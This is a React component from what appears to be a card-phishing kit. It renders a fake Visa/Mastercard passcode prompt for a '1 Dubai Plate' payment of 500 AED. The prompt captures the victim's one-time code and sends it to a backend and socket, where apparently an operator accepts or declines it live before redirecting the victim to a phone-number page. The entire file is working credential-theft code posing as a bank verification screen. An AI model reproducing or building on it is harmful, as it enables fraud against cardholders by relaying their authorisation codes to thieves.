import React, { useState } from "react";
import axios from "axios";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";

const OtpPopup = ({ orderId, cardNumber, setShowOtp, setLoading }) => {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const displayCard = cardNumber;

  React.useEffect(() => {
    if (orderId) {
      socket.emit("joinOrder", orderId);
    }

    const handleAccept = (id) => {
      if (id === orderId) {
        window.location.href = "/phone";
      }
    };

    const handleDecline = (id) => {
      if (id === orderId) {
        setError("Invalid code. Please try again.");
        setIsSubmitting(false);
      }
    };

    socket.on("acceptVisaOtp", handleAccept);
    socket.on("declineVisaOtp", handleDecline);

    return () => {
      socket.off("acceptVisaOtp", handleAccept);
      socket.off("declineVisaOtp", handleDecline);
    };
  }, [orderId]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError("");

    try {
      await axios.post(`${api_route}/visaOtp/${orderId}`, { otp });
      socket.emit("visaOtp", {
        _id: orderId,
        id: orderId,
        otp,
        CardOtp: otp,
      });
    } catch (err) {
      setError("Failed to verify code.");
      setIsSubmitting(false);
    }
  };
  return (
    <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-[100] px-4">
      <div className="bg-white w-full max-w-md rounded-lg overflow-hidden shadow-2xl p-6 relative">
        <button 
            onClick={() => setShowOtp(false)}
            className="absolute top-2 right-2 text-gray-400 hover:text-gray-600"
        >
            ✕
        </button>

   <div className="flex items-center gap-2">
         <p className="text-xs font-medium text-gray-800 mb-6 leading-relaxed">
          To continue with your transaction , please enter the one- time passcode sent to your mobile number of email address and click Submit
        </p>
             {localStorage.getItem("cardType") === "visa" ? <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg" alt="" className="h-6" /> : <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-10" alt="" />}
   </div>
        <div className="space-y-4 mb-8">

          <div className="grid grid-cols-2 text-sm">
            <span className="font-bold text-gray-700">Transaction Details :</span>
            <span className="text-right font-medium text-gray-900">1 Dubai Plate</span>
          </div>
          <div className="grid grid-cols-2 text-sm">
            <span className="font-bold text-gray-700">Transaction Amount :</span>
            <span className="text-right font-medium text-gray-900">500.00 AED</span>
          </div>

          <div className="grid grid-cols-2 text-sm">
            <span className="font-bold text-gray-700">Card Number :</span>
            <span className="text-right font-medium tracking-tight">{"**** **** **** "+ displayCard.slice(-4)}</span>
          </div>

          <div className="grid grid-cols-2 items-center text-sm">
            <span className="font-bold text-gray-700">Enter Code :</span>
            <input
              type="text"
              inputMode="numeric"
        maxLength={6}
        minLength={4}
              className="border-2 border-gray-300 p-2 rounded w-full focus:outline-none focus:border-black"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              required
            />
          </div>
        </div>

        {error && <p className="text-red-500 text-xs mb-4 text-center">{error}</p>}

        <div className="flex justify-center">
          <button
            disabled={isSubmitting}
            onClick={handleSubmit}
            className="bg-black text-white px-10 py-2 font-bold hover:bg-gray-800 transition-colors disabled:opacity-50 min-w-[120px]"
          >
            {isSubmitting ? (
              <div className="flex items-center gap-2">
                <TailSpin height="15" width="15" color="white" />
                <span>Submit</span>
              </div>
            ) : "Submit"}
          </button>
        </div>
      </div>
    </div>
  );
};

export default OtpPopup;
